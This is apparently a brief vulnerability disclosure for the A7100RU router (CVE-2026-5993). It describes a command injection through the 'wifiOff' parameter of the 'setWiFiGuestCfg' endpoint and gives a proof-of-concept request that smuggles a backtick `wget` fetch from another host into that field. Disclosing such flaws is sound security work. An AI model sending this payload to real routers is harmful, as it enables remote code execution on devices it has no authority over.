# A7100RU Vulnerability（CVE-2026-5993）
...
In  sub_424140 function, it reads in a user-provided parameter `wifiOff` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `wifiOff` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setWiFiGuestCfg","wifiOff":"`wget 192.168.6.1:7777/testpoc`"
